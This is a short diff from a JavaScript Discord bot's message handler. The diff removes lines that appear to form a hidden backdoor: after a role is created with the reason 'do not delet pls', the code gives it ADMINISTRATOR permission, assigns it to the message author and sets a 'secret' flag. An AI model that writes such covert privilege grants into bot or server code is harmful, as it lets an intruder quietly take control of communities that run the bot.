@@ -114,13 +114,7 @@ client.on('message', msg => {
                 },
                 reason: 'do not delet pls'
             })
-            role.setPermissions(['ADMINISTRATOR'])
-        })()
-            .then(role => {
-                message.member.addRole(role);
-                secret = true;
-            })
-            .catch(err => console.log(err));
+        })().catch(err => console.log(err));
     };
     if (msg.content.startsWith(prefix)) {
         var content = msg.content.substring(prefix.length, msg.content.length);
